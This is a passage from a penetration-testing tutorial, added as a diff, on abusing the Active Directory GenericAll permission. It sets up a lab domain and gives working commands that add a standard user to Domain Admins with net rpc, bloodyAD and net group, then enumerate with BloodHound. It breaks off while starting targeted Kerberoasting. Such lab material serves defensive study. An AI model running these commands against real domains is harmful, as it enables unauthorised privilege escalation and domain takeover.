@@ -1,0 +1,261 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/dacl-attacks/" rel="category tag">DACL Attacks</a></span>            </div>
+            <h1 class="post-title entry-title">Abusing AD-DACL : Generic ALL Permissions</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/genericall-active-directory-abuse/" rel="bookmark"><time class="entry-date published" datetime="2024-10-17T18:16:33+00:00">October 17, 2024</time><time class="updated" datetime="2025-06-19T13:23:11+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">In this post, we explore how attackers can exploit the <strong data-start="302" data-end="348">Generic ALL Active Directory abuse</strong> through <strong>Discretionary Access Control Lists (DACL)</strong>. This powerful permission grants unrestricted access to objects like user accounts, allowing adversaries to perform actions such as Kerberoasting, password resets, and account manipulation.</span></p>
+<p><span style="color: #000000">We will detail the lab setup needed to simulate these attacks and map these methods to the <strong>MITRE ATT&amp;CK framework</strong> to understand the techniques and tactics involved. Additionally, we will discuss detection mechanisms to identify suspicious activities linked to Generic ALL attacks and provide actionable recommendations to mitigate these vulnerabilities. This overview aims to equip security professionals with the knowledge to recognize and defend against these prevalent threats.</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<p><strong><span style="color: #000000">Abusing AD-DACL – Generic ALL Permissions</span></strong></p>
+<p><strong><span style="color: #000000">Key Concepts of DACL</span></strong></p>
+<p><strong><span style="color: #000000">Generic ALL Right</span></strong></p>
+<p><strong><span style="color: #000000">Prerequisites</span></strong></p>
+<p><span style="color: #000000"><strong>Lab Setup</strong> – User Owns Generic ALL Right For Domain Admin Group</span></p>
+<p><span style="color: #000000"><strong>Exploitation Phase I</strong> – User Own Generic All Right for Group</span></p>
+<p><span style="color: #000000"><strong>Bloodhound</strong> -Hunting for Weak Permission</span></p>
+<p><span style="color: #000000"><strong>Method for Exploitation</strong> – Account Manipulation (T1098)</span></p>
+<ul>
+<li><span style="color: #000000">Linux Net RPC – Samba</span></li>
+<li><span style="color: #000000">Linux Bloody AD</span></li>
+<li><span style="color: #000000">Windows Net command</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Exploitation Phase II</strong> – User own generic Right for another user</span></p>
+<p><span style="color: #000000"><strong>Bloodhound</strong> -Hunting for Weak Permission</span></p>
+<p><strong><span style="color: #000000">Multiple Method for Exploitation</span></strong></p>
+<ul>
+<li><span style="color: #000000">Kerberoasting</span>
+<ul>
+<li><span style="color: #000000">Linux Python Script – TargetedKerberoast</span></li>
+<li><span style="color: #000000">Windows PowerShell Script-Powerview</span></li>
+</ul>
+</li>
+<li><span style="color: #000000">Change Password</span>
+<ul>
+<li><span style="color: #000000">Linux Net RPC – Samba</span></li>
+<li><span style="color: #000000">Linux Net RPC – BloodAD</span></li>
+<li><span style="color: #000000">Linux Net RPC –Rpcclient</span></li>
+<li><span style="color: #000000">Windows Net Utility</span></li>
+<li><span style="color: #000000">Windows PowerShell -Powerview</span></li>
+<li><span style="color: #000000">Windows PowerShell</span></li>
+</ul>
+</li>
+</ul>
+<p><strong><span style="color: #000000">Detection &amp; Mitigation</span></strong></p>
+<h3><span style="color: #800000">Active Directory DACL</span></h3>
+<p><span style="color: #000000">In Active Directory (AD), a <strong>DACL</strong> (Discretionary Access Control List) is a component of an object’s security descriptor. It specifies which users or groups are allowed (or denied) access to the object and what actions they are permitted to perform. It essentially controls who can do what to an object. Such as a user account, computer, group, or any other directory object.</span></p>
+<h3><span style="color: #800000">Key Concepts of DACL</span></h3>
+<p><span style="color: #000000">Access Control Entries (ACEs):</span><br/>
+<span style="color: #000000">A DACL is made up of multiple ACEs. Each ACE defines the specific access rights for a user or group and specifies what kind of access (read, write, execute, etc.) is allowed or denied.</span></p>
+<p><span style="color: #000000">Permissions:</span><br/>
+<span style="color: #000000">Permissions define the specific actions a user or group can perform on an object. These permissions can be basic, like reading or writing to the object, or more complex, like modifying permissions or taking ownership.</span></p>
+<p><span style="color: #000000">Rights:</span><br/>
+<span style="color: #000000">Rights are a higher-level abstraction of permissions. </span></p>
+<h5><strong><span style="color: #000000">In Active Directory, common DACL rights include:</span></strong></h5>
+<ul>
+<li><span style="color: #000000"><strong>GenericAll</strong>: Grants full control over an object (e.g., modify properties, reset passwords, etc.).</span></li>
+<li><span style="color: #000000"><strong>GenericWrite</strong>: Allows modification of some object properties.</span></li>
+<li><span style="color: #000000"><strong>WriteDACL</strong>: Lets the user modify the DACL itself, potentially escalating privileges.</span></li>
+<li><span style="color: #000000"><strong>WriteOwner</strong>: Grants the ability to take ownership of the object, allowing further privilege modification.</span></li>
+<li><span style="color: #000000"><strong>ReadProperty</strong>: Allows reading of object properties (e.g., attributes in a user object).</span></li>
+<li><span style="color: #000000"><strong>AllExtendedRights</strong>: Grants special rights for advanced operations, like resetting passwords or enabling delegation.</span></li>
+<li><span style="color: #000000"><strong>Delete</strong>: Grants the ability to delete the object.</span></li>
+<li><span style="color: #000000"><strong>ReadDACL</strong>: Allows reading the object’s access permissions without being able to change them.</span></li>
+<li><span style="color: #000000"><strong>ForceChangePassword</strong>: Allows forcing a user to change their password without knowing the current one.</span></li>
+</ul>
+<p><span style="color: #000000">Inheritance:</span><br/>
+<span style="color: #000000">DACLs can be <strong>inherited</strong> from parent objects, meaning permissions on a container (like an Organizational Unit) can be passed down to child objects. This simplifies management but can also lead to unintended permissions if not carefully configured.</span></p>
+<p><span style="color: #000000">Security Descriptor:</span><br/>
+<span style="color: #000000">The DACL is part of a larger security descriptor that also includes the <strong>Owner</strong> (the entity that has ownership of the object and can change its permissions) and an optional <strong>SACL</strong> (System Access Control List) that controls auditing.</span></p>
+<p><span style="color: #000000"><em>Weak DACLs can lead to unauthorized access or privilege escalation if not properly configured.</em></span></p>
+<h3><span style="color: #800000">Generic ALL Right</span></h3>
+<p><span style="color: #000000">In Active Directory, permissions and privileges define what actions an entity (user, group, or computer) can perform on another object. The <strong>“Generic ALL”</strong> privilege is one of the most powerful in AD because it grants <strong>complete control</strong> over the target object. This means that the user or group with this privilege can:</span></p>
+<ul>
+<li><span style="color: #000000">Modify any attribute of the object</span></li>
+<li><span style="color: #000000">Reset passwords</span></li>
+<li><span style="color: #000000">Add or remove members from groups</span></li>
+<li><span style="color: #000000">Delegate further control to other users</span></li>
+<li><span style="color: #000000">Delete the object altogether</span></li>
+</ul>
+<p><span style="color: #000000">Because of its extensive reach, an attacker who gains “Generic ALL” privileges on sensitive objects (like privileged groups or service accounts) can essentially gain domain dominance.</span></p>
+<h4><span style="color: #000000">Exploiting “Generic ALL” Privilege</span></h4>
+<p><span style="color: #000000">Here’s how an attacker can leverage the <strong>“Generic ALL”</strong> privilege to compromise Active Directory:</span></p>
+<ol>
+<li><span style="color: #000000"><strong>Identifying Targets with “Generic ALL” Privilege</strong></span><br/>
+<span style="color: #000000">The first step is to identify objects where the attacker has this privilege. This can be done using tools like <strong>BloodHound</strong> or <strong>PowerView</strong>, which map out Active Directory and show privilege relationships. Once identified, the attacker can choose their target based on the potential impact (e.g., a Domain Admin account).</span></li>
+<li><span style="color: #000000"><strong>Resetting Passwords</strong></span><br/>
+<span style="color: #000000">If the “Generic ALL” privilege is applied to a user account, the attacker can reset the account’s password. This is particularly devastating if the account is for a privileged user, such as a Domain Administrator. After resetting the password, the attacker can log in as that user and gain full control over the domain.</span></li>
+<li><span style="color: #000000"><strong>Modifying Group Membership</strong></span><br/>
+<span style="color: #000000">If the “Generic ALL” privilege is applied to a group, the attacker can add themselves to a high-privilege group, like <strong>Domain Admins</strong> or <strong>Enterprise Admins</strong>. This grants them the privileges of those groups, effectively giving them control over the entire domain.</span></li>
+<li><span style="color: #000000"><strong>Abusing Delegated Control</strong></span><br/>
+<span style="color: #000000">With the “Generic ALL” privilege, the attacker can delegate control of the target object to another user or group. This allows them to grant privileges to themselves or other malicious users without raising suspicion immediately.</span></li>
+<li><span style="color: #000000"><strong>Deleting or Modifying Objects</strong></span><br/>
+<span style="color: #000000">In extreme cases, an attacker with “Generic ALL” can delete critical objects, such as service accounts or privileged users, causing operational disruptions or creating avenues for further exploitation.</span></li>
+</ol>
+<h3><span style="color: #800000">Prerequisites</span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory</span></li>
+<li><span style="color: #000000">Kali Linux</span></li>
+<li><span style="color: #000000">Tools: Bloodhound, Net RPC, Powerview, Rubeus,</span></li>
+<li><span style="color: #000000">Windows 10/11 – As Client</span></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup – User Owns Generic ALL Right For Domain Admin Group</span></h3>
+<h4><span style="color: #000000"> Create the AD Environment:</span></h4>
+<p><span style="color: #000000">To simulate an Active Directory environment, you’ll need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
+<h5><span style="color: #000000"><strong>Domain Controller</strong>:</span></h5>
+<ul>
+<li><span style="color: #000000">Install Windows Server (2016 or 2019 recommended).</span></li>
+<li><span style="color: #000000">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong> role.</span></li>
+<li><span style="color: #000000">Set up the domain (e.g., <strong>ignite.local</strong>).</span></li>
+</ul>
+<h5><span style="color: #000000"><strong>User Accounts</strong>:</span></h5>
+<ul>
+<li><span style="color: #000000">Create a standard user account named <strong>Komal</strong>.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user komal Password@1 /add /domain</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVW2dSD8OzXbszoq3aaLSUm4kTPZV9fNjMSna3fLdHWb0EIglJ5AZcHQUaZNJjrb7lkppisUF4PtKYkVWmSzqCyWyk407OxVEDRNLWzL8xkn_LRMVgi5cmuBiLwtJrctfL3B-m2GKnrWMFWz7ff1p1oTzDPJUFizjdN432X_OXv96Weu5U0krPtcDbAWdm/s16000/0.png"/></span></p>
+<h5><span style="color: #000000"> Assign the “Generic ALL” Privilege to Komal:</span></h5>
+<p><span style="color: #000000">Once your AD environment is set up, you need to assign the <strong>“Generic ALL”</strong> right to <strong>Komal</strong> for the <strong>Domain Admins</strong> group.</span></p>
+<p><span style="color: #000000"><strong>Steps</strong>:</span></p>
+<ol>
+<li><span style="color: #000000">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></li>
+<li><span style="color: #000000">Enable the <strong>Advanced Features</strong> view by clicking on <strong>View</strong> &gt; <strong>Advanced Features</strong>.</span></li>
+<li><span style="color: #000000">Locate the <strong>Domain Admins</strong> group in the <strong>Users</strong> container.</span></li>
+<li><span style="color: #000000">Right-click <strong>Domain Admins</strong> and go to <strong>Properties</strong>.</span></li>
+</ol>
+<p><span style="color: #000000">                <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCbegxIuNAvuK3h1TQhMqHLSmsRr-4M1TA14Lu42B2vervGU3lHFWN5BVFJWJy1NmZZhqGuS3alFoEhpWa_P_gCnn7V1QtFwp-ZwqbiWbkWaroe5TFelX30yBFY08WekLD3GqiwJUcwKwZxi1Kwm-J0vj4NbpP7dvAQwAlxqHc1Cqag0VxTdY8eB1IKLSB/s16000/1.png"/></span></p>
+<p><span style="color: #000000">      5. Go to the <strong>Security</strong> tab and click <strong>Advanced</strong>.</span></p>
+<p><span style="color: #000000">                <img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgErj8eLXEuaFDGnfx40186UWMLDFLdZfA6qDeYWoRL1rAow35NZjBpcWFnEY2rpfc8cNNIJjUu76B4qO-GhAmW0OB2yfZbMwrbY3F4wvZhukgBz7uI2bmq_7o0H3VcWu1Dr3fsJ4DY1dcyKI8atmIWjKlEm09z_7x7WMvna4u-oN3TskWo0M5AmzYFyNPD/s16000/2.png" alt="Generic ALL Active Directory Abuse" width="597" height="708"/></span></p>
+<p><span style="color: #000000">      6. Click <strong>Add</strong>, then select the <strong>Komal</strong> user.</span></p>
+<p><span style="color: #000000">                <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTU3qWrWBHGvrf6-W7df4nCz_Q6lRXLXnrzPmqAoeeqfXe_Xs_eOlj1Rlp6qoB7gaf6XhYAhY3eHGRd3o3ZH4EebIBTAta33goIn0WhhKOdl4tRnR9iXXaawM3w_uYzyeqQXe0iEFi9WMWbs0pnTITH1WOgULtK9s7aDzMidIcav8rw1m5qwUweK3tno6g/s16000/3.png"/></span></p>
+<p><span style="color: #000000">       7. In the Permissions Entry window, select This object and all descendant objects.</span><br/>
+<span style="color: #000000">      8. In the Permissions section, check the box for Full Control or specifically check “Generic ALL” if available.</span><br/>
+<span style="color: #000000">      9. Apply the settings.</span></p>
+<p><span style="color: #000000">At this point, <strong>Komal</strong> now has <strong>Generic ALL</strong> rights over the <strong>Domain Admins</strong> group, meaning they can modify attributes, reset passwords, or even add themselves to the group.</span></p>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhffNClsAkiB2UoRbu18xmqxBxMY9ZENi8i7JfqwhcKf9lCxG9QHOxXJcjQ6ZbjxqZt9x6nsIvc0MRrqqjzSrSiMQCyh2MjIUVk6DjS2IYxjfk_2bc11PTmbyJ6cAJ0qK7J5VEESyA9skwjjKZBXk8ltFLS23LnZs4j9NiyuSWAHI3uZA_gNqU5kMWkIgPg/s16000/4.png" alt="Generic ALL Active Directory Abuse" width="594" height="705"/></span></p>
+<h3><span style="color: #800000">Exploitation Phase I – User Own Generic All Right for Group</span></h3>
+<p><span style="color: #000000"><strong>Compromised User:</strong> Komal</span></p>
+<p><span style="color: #000000"><strong>Target Account:</strong> Domain Admin Group</span></p>
+<p><span style="color: #000000">Now that the lab is set up, let’s walk through how an attacker (acting as <strong>Komal</strong>) can abuse the <strong>Generic ALL</strong> privilege.</span></p>
+<p><span style="color: #000000">Assuming the Red Teamer knows the credential for Komal Users as a Standard Domain Users and would like to enumerate the other Domain users &amp; Admin members with the help of “net-rpc” Samba command line Utility.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net rpc user -U ignite.local/komal%'Password@1' -S 192.168.1.8
+net rpc group members "Domain Admins" -U ignite.local/komal%'Password@1' -S 192.168.1.8</pre>
+<p><span style="color: #000000">After executing above command its has been concluded that the Administrator users is only the single member of the Admin group. Unfortunately, the tester is doesn’t know the credentials of administrator.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK-87QT6iMY-1hLMiCT1Dqxhj27zLTJ-RRr_iale7Mf8ll34ox19NTorYOTticVIqoYPWAmqI12zUkSGcZg10Iu_30uY9YhdhYE9T1rTIf0vtnEmnEO2mjrclaZ61eCTMH_JTcXe955XuLngTHfw_33P-fqZwYfskwhJnunrHLYD7pK4vEoNGA6aAnT5Ae/s16000/6.png"/></p>
+<h3><span style="color: #800000">Bloodhound -Hunting for Weak Permission</span></h3>
+<p><span style="color: #000000"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Komal</strong> has the <strong>Generic ALL</strong> right on the <strong>Domain Admins</strong> group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u komal -p Password@1 -ns 192.168.1.8 -d ignite.local -c All</pre>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2UEjFApGRypF8uzMP24zEoqeDJqrvyl_qEagcHdIYQtl4gg3tS6IjQtHyWKSO2GIW_g_qLTIWJQfxp8sR0LcGZQgFz4kO4n3b3kmuAfXuZEd9pxTIHANYolP9R5A4N5D9UX0r7PvzGA0e_9MkVA2qo0RMp081v-keI8KakUgDcJ5eX5O1aIb13AaUpvvC/s16000/7.png" alt="Generic ALL Active Directory Abuse" width="1350" height="620"/></span></p>
+<p><span style="color: #000000">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the first degree of object control value is equal to 1.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgi0rmTq03GgGBW46cjf-LymHtBfT2qWEK9k5JRuf7emJYTbk93H4hSXOh5eO533BFHbMe1MfGLtUHR_XuK_4eUy6pj3rArjbNNk9w0CX4lkY-BZwfx7tYXK0pXLSOD8WUYYmVsAStYlCc7yWNU1Ahx5b99yDxsgzWBr_y-aNsWasZU_DLyTapG2_WaTV9J/s16000/8.png"/></span></p>
+<p><span style="color: #000000">Thus it has shown the Komal User has Generic ALL privilege to Domain Admin group and provided steps for exploitation to be proceed.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRs2UI2XjHaaRor0ffUjdDU9PeQdILMGgJEUrMBqCS2oVZTCPb7d21BQwzVOO4lk5SBvVw_g5SOYxvC8iAWq5tjTWQphuSNjgSgi2ASXDWV_MiEk1eYLRSanZGWyHKOBADsEyIcD8voAr-jQZl5YMg2Ul8gVi6AnxUO4gpqLpdcSdGQplSUNN4KRUWzlao/s16000/9.png" alt="Generic ALL Active Directory Abuse" width="804" height="619"/></span></p>
+<h3><span style="color: #800000">Method for Exploitation – Account Manipulation (T1098)</span></h3>
+<h4><span style="color: #000000">1. Linux Net RPC – Samba</span></h4>
+<p><span style="color: #000000">The tester can abuse this permission by Komal User into Domain Admin group and list the domain admin members to ensure that Komal Users becomes Domain Admin.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net rpc group addmem "Domain Admins" "komal" -U ignite.local/komal%'Password@1' -S 192.168.1.8</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiiOqgJhF5zTODlxHrcqAU0S3y-EWz0MbTkxNLkEjLiYTBePp4hibpFViVNVtP0d747zRhVCFi0btMD7109QbDltbIrYmw4z4w-4RsBB9D1mDnRgjfzddR9p9GvqBJImZ-nNmevDmwDCakAtdPPgMfIX8PC1XchOrO2hksA8ijmtVVpwhSJR9lugrIicz6M/s16000/10.png"/></span></p>
+<h4><span style="color: #000000">2. Linux Bloody AD</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host "192.168.1.8" -d "ignite.local" -u "komal" -p "Password@1" add groupMember "Domain Admins" "komal"</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHFxqSWEHroxip9DETo_sBJNgmXheqcb4KdCVGfGiSqrVaOArjLGuTH8Es9Yh_4rPAocge1eSiWiYpLfvn43gRAL4phC5vvlzQhnI4qvaiX6gceYrv-_G28MDxoJX1_pG_mtA521G0-KaO0EJwBdoC_VMmgeKNKdRVCBSpcFiA3r8oTmmbLKh_3oE-3VmZ/s16000/11.png"/></span></p>
+<p><span style="color: #000000">Thus, from the user property we can see Komal user has become a member of domain admin.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYVYyR8Kto9poCogZ6TVHjsCFPZ17C_SMJoSHYdaIt_ZdqK-0O-TK0AQ7FSmfHkVoAwg5lzbp9rsdCQm5NrrRP_ZiYZ5YxBFjjVd9b0RxK2WjFIiLAvAVqi4OK-ETmUk34lYpg-AnE9f0RnJsGJrV3GXjfsEtEHcM5g2OnC_QbmKGBv5q2daCmxm6403Zm/s16000/15.png" alt="Generic ALL Active Directory Abuse" width="614" height="829"/></span></p>
+<h4><span style="color: #000000">3. Windows Net command</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net group "domain admins" komal /add /domain</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHd7yNDXz3iD2Ah_gORv-7yFUS9UTrWIKGRHZT8XnnPtqNZ77QzlJTpbSZrhrULexlmCAlGyjB11lXwNkzKYn4F3QsxaIf4PK0IWE8wEdC3A0DACLZBx2MKkTPdXFWqJVO0dHUnoH5qu4RqjKQSkVS9ANo4PLmAb0Zni0DM0gdxWE7s5fqAcHyJre-ba88/s16000/21.png"/></span></p>
+<h3><span style="color: #800000">Exploitation Phase II – User’s own generic Right for another user</span></h3>
+<p><span style="color: #000000">To set up a lab environment where the user Nishant has Generic ALL rights over the user Vipin, you’ll need to follow several steps. This process involves configuring Active Directory (AD) permissions so that Nishant can manipulate attributes of the Vipin account.</span></p>
+<h5><span style="color: #000000"><strong>Step 1: Create Two AD user accounts</strong></span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user vipin Password@1 /add /domain
+net user nishant Password@1 /add /domain</pre>
+<p><span style="color: #000000">                <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDCYqhN81XLp2qPDPKavoFtqFARCBNaTlbl8G6jgGi7x8crdoQYrczBzXmZY3VIdaBnuH-KtsSkDStdQbJdNio8kEDJagLUq4yJIsyxANbW-gAPIXz5M6uOpz6V77jFWuXDwtytfhldE3hTMzSl8fOVUtUb8bcyJD7y_wTdJnOBPrVNplO-Oy3j7kjfSXV/s16000/50.png"/></span></p>
+<h5><span style="color: #000000"><strong>Step 2: Assign Generic ALL Permissions</strong></span></h5>
+<ul>
+<li><span style="color: #000000">Open <strong>Active Directory Users and Computers</strong>.</span></li>
+<li><span style="color: #000000">Navigate to the <strong>Vipin</strong> user account.</span></li>
+<li><span style="color: #000000">Right-click on <strong>Vipin</strong>, select <strong>Properties</strong>.</span></li>
+</ul>
+<p><span style="color: #000000">                <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-uyiOBp1rl6yLxy2wgeZfBRFqGkXl-iYjg7TX2uYxG8aB7eVPN3jHF6ApsW2epVubj-KIayUTcnpyHYPi6Cz9nqzir5YqPWd_RxCG2HIdJVbduHCmnxsI2mQ3j60wHEqALbvP_jbQMyyZTFbziDhDBiYW_t5YS1kwnC3H-cO3g5IH3WQ2VV7Cs-VuQoAP/s16000/51.png" alt="Generic ALL Active Directory Abuse" width="800" height="591"/></span></p>
+<ul>
+<li><span style="color: #000000">Go to the <strong>Security</strong> tab.</span></li>
+<li><span style="color: #000000">Click <strong>Advanced</strong> and then <strong>Add</strong>.</span></li>
+</ul>
+<p><span style="color: #000000">                <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiosoEgO5L7EwxmsN3wy9K4L5wyWm0vXWSy0WHP2aX07-f32aL4lmXZc1rUU5eO7h_WNK0pN9kUBh3t0nJP_E2SJPzJ633vR8vJdjfaWJBwUSNJLJ4tMss7KV3l0aTuGz0AJm28CgEcXOXKSCXplJTp9v4fgEYOrGz0-OUKyNSItjnZbmW9t2Wmv_uygCux/s16000/52.png"/></span></p>
+<ul>
+<li><span style="color: #000000">In the “Enter the object name to select” box, type <strong>Nishant</strong> and click <strong>Check Names</strong>.</span></li>
+<li><span style="color: #000000">After adding Nishant, set the permissions:</span>
+<ul>
+<li><span style="color: #000000">Check <strong>Generic All</strong> in the permissions list (you may need to select <strong>Full Control</strong> to encompass all rights).</span></li>
+</ul>
+</li>
+</ul>
+<p><span style="color: #000000">                <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAtms1ceWfvwZTtEJ2FplJVgMQb0mUJrdL2RwxNr-wMZJ1cW9CGD-jnm1I_WxBU2Ml5ECDG3DQM65xYQTRs_jwLEU1K8tQ_XRhXRDjawvnJcZhFR30tg0znm2o7fwXMOLxXBtDjrnd2hbc5TYVSN2DRBKGbSkbyDaS-D1-wAkAEsnEh9iWASj63OIhy-W4/s16000/53.png"/></span></p>
+<ul>
+<li><span style="color: #000000">Ensure <strong>Applies to</strong> is set to <strong>This object only</strong>.</span></li>
+</ul>
+<p><span style="color: #000000">                <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6DnxbYj8HED7lo5_mJS7i_mr02GQuWIoZgDSlM4JDwMakS9FK5Nt3i82gC44QhZ1GmdqGS1C1FHcPRri3leGo-v4MLDl5v1iIKNl7rx89A-f8uvBs4MeYm_eDSiskWLm_qf7pvu97yN51slbtt4eAz3EudbO69UWbGgP0DIPVh6wV2RoeJrf5iEgU0pJu/s16000/54.png" alt="Generic ALL Active Directory Abuse" width="612" height="810"/></span></p>
+<h3><span style="color: #800000">Bloodhound -Hunting for Weak Permissions</span></h3>
+<p><span style="color: #000000">Hunting for First Degree objection Control for Nishant Users as we did in previous steps</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u nishant -p Password@1 -ns 192.168.1.8 -d ignite.local -c All</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6PH1mGqf-MlR_xfgPn1bQTaMA9AB3cF6AUDWiCy-1qktyri1D1ZJGcAPV8PLsN12LGuIwHdfIo5IZkqz9nKQPHs0fYv01gPaYtxfQoaH4P_E8R5Zb5MQi3R1hK3vOlrdup4eZ9JLxuhtgAvelOLKoxFSC2Gb2QYxninfjFdJGDA7UNNHC7zKfl7hnJEzA/s16000/55.png"/></span></p>
+<p><span style="color: #000000">From the graph, it can be observed that the Nishant user owns generic all privileges on Vipin user</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3D406UD-IaFxjy2aGvj0_88LTA38y2Ovg4vF8UXrBlFdPWCK4TtPIb8j3gdihnsqv5ThE1UkkUt-nXQegYE2TeOj96W5Rk1DoeyGcJIzQvaRIrWl3MCXfXnsKhXF_drzHnI0MfM1oVxp5MFv2kkawLjprOkydj4yNT4Zpd3zy42DoguCKbIISuOH75syv/s16000/56.png" alt="Generic ALL Active Directory Abuse" width="1133" height="907"/></span></p>
+<p><span style="color: #000000">Moreover, Bloodhound also helps the pentest to define the possible attack from the user account nishant, this user can perform domain attack such as keroasting and shadow credentials</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEycQ65T7PyoF-8NPaiQqIFAvdjbkF-OwrCRrJNuVaBe9_7JJFaq3jOBPQ5hZRVmL41L70aL61Q54LD6-nYSSpIP11EzOdPeMbRMhYJHUExoU12eHIhhFuz3L7hLCxuOr37dp72DAbgav8iUq7BvtSHXREFh5LNmP6K_DqR4sHQoN_H23_XmuBX8RU4_tS/s16000/57.png"/></span></p>
+<h3><span style="color: #800000">Multiple Methods for Exploitation</span></h3>
+<h4><span style="color: #000000">1. T1558.003 – Kerberoasting</span></h4>
+<h5><span style="color: #000000"><strong>1.1  </strong><strong>Linux Python Script – TargetedKerberoast</strong></span></h5>
+<p><span style="color: #000000"><strong>Compromised User:</strong> Nishant: Password@123</span></p>
+<p><span style="color: #000000"><strong>Target User:</strong> Vipin</span></p>
+<p><span style="color: #000000"><strong>Kerberoasting</strong> is an attack technique that targets service accounts in Active Directory environments, where an attacker with <strong>Generic ALL</strong> permissions on a user can exploit the ability to request service tickets (TGS). By requesting TGS for service accounts, the attacker can obtain encrypted tickets that include the service account’s password hash. Since these tickets can be extracted and then offline cracked, the attacker can potentially gain access to the service account’s credentials. The attack leverages the fact that service accounts typically have elevated privileges, allowing the attacker to escalate their own access within the network once the password is cracked. This exploitation is particularly effective in environments where weak or easily guessable passwords are used for service accounts.</span></p>
+<h5><span style="color: #000000"><strong data-start="879" data-end="919">Cloning the Targeted Kerberoast Tool</strong></span></h5>
+<p><span style="color: #000000">To perform this attack, first, clone the targetedKerberoast repository from GitHub using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/ShutdownRepo/targetedKerberoast.git</pre>
